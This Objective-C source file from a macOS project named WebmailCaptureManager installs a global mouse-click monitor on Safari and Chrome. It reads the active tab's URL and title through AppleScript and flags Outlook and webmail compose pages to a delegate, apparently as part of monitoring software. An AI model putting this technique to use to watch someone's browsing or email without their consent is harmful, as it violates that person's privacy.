//
//  PageValueChangeNotifier.m
//  WebmailCaptureManager
//
//  Created by Makara Khloth on 11/4/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "PageValueChangeNotifier.h"

#import "PageVisitedDelegate.h"
#import "PageInfo.h"

#import <AppKit/AppKit.h>

@implementation PageValueChangeNotifier

@synthesize mMouseEventHandler;
@synthesize mDelegate;
@synthesize mSelector;

#pragma mark - Override methods

- (void) stopNotify {
    [super stopNotify];
    
    [self unregisterMouseClick];
}

- (void) pageVisitedRegisterAppNotify:(NSNotification *) notification {
    [super pageVisitedRegisterAppNotify:notification];
    
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys] objectAtIndex:0]];
    
    if ([[runningapp bundleIdentifier] isEqualToString:@"com.apple.Safari"] ||
        [[runningapp bundleIdentifier] isEqualToString:@"com.google.Chrome"]) {
        [self registerMouseClick:runningapp.bundleIdentifier];
    } else if ([[runningapp bundleIdentifier] isEqualToString:@"org.mozilla.firefox"]) {
        
    }
}
    
- (void) pageVisitedUnRegisterAppNotify:(NSNotification *) notification {
    [super pageVisitedUnRegisterAppNotify:notification];
    
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    if ([[runningapp bundleIdentifier] isEqualToString:@"com.apple.Safari"] ||
        [[runningapp bundleIdentifier] isEqualToString:@"com.google.Chrome"]) {
        [self unregisterMouseClick];
    }else if ([[runningapp bundleIdentifier] isEqualToString:@"org.mozilla.firefox"]) {
        
    }
}
    
- (void) pageVisitedUnRegisterAppNotifyCaseTerminate:(NSNotification *) notification {
    [super pageVisitedUnRegisterAppNotifyCaseTerminate:notification];
    
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    
    if ([appBundleIdentifier isEqualToString:@"com.apple.Safari"] ||
        [appBundleIdentifier isEqualToString:@"com.google.Chrome"]) {
        [self unregisterMouseClick];
    } else if ([appBundleIdentifier isEqualToString:@"org.mozilla.firefox"]) {
        
    }
}

#pragma mark - Private methods

- (void) registerMouseClick: (NSString *) aBundleID {
    @try {
        [self unregisterMouseClick];
        
        NSString *bundleID = aBundleID;
        self.mMouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
            
            PageInfo *page = [[[PageInfo alloc] init] autorelease];
            
            if ([bundleID isEqualToString:@"com.apple.Safari"]) {
                NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
                NSDictionary *error = nil;
                NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
                
                if (!error) {
                    page.mUrl = [[scptResult descriptorAtIndex:1] stringValue];
                    page.mTitle = [[scptResult descriptorAtIndex:2] stringValue];
                }
                [scpt release];
            }
            
            if ([bundleID isEqualToString:@"com.google.Chrome"]) {
                NSAppleScript *scpt = [[NSAppleScript alloc] initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
                NSDictionary *error = nil;
                NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:&error];
                
                if (!error) {
                    page.mUrl = [[scptResult descriptorAtIndex:1] stringValue];
                    page.mTitle = [[scptResult descriptorAtIndex:2] stringValue];
                }
                [scpt release];
            }
            
            NSRunningApplication *rApp = [[NSRunningApplication runningApplicationsWithBundleIdentifier:bundleID] firstObject];
            page.mApplicationID = bundleID;
            page.mApplicationName = rApp.localizedName;
            page.mPID = rApp.processIdentifier;
            
            // outlook.live.com --> Ok
            // mail. && compose or mail. && Compose --> Ok
            if (([page.mUrl rangeOfString:@"outlook.live.com"].location != NSNotFound) ||
                ([page.mUrl rangeOfString:@"mail."].location != NSNotFound &&
                ([page.mUrl rangeOfString:@"compose"].location != NSNotFound ||
                 [page.mUrl rangeOfString:@"Compose"].location != NSNotFound))) {
                DLog(@"### Mouse click page, title : %@, url : %@", page.mTitle, page.mUrl);
                if ([self.mDelegate respondsToSelector:self.mSelector]) {
                    [self.mDelegate performSelector:self.mSelector withObject:page];
                }
            }
        }];
    }
    @catch (NSException *exception) {
        DLog(@"Mouse click for Google Chrome and Safari exception : %@", exception);
    }
}

- (void) unregisterMouseClick {
    if (self.mMouseEventHandler != nil) {
        [NSEvent removeMonitor:self.mMouseEventHandler];
        self.mMouseEventHandler = nil;
    }
}

- (void) dealloc {
    [self unregisterMouseClick];
    [super dealloc];
}

@end
